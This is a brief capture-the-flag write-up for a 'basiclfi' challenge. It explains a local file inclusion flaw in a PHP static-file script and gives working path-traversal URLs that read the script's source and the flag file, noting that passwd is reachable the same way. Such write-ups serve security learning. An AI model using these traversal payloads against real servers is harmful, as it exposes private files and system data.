# basiclfi

http://basiclfi.challs.cyberchallenge.it/

This website is powered by a php server. There's a "static.php" script that basically serves .css and .js by specifying the parameter static_file in the URL

http://basiclfi.challs.cyberchallenge.it/static.php?static_file=/../static.php

This link will allow you to get the "static.php" file itself or any other file

To exfiltrate the files in the endpoint one would need to simply put enough "../" and reach whatever they want, even passwd

To get the flag simply do http://basiclfi.challs.cyberchallenge.it/static.php?static_file=/../../../../../../flag.txt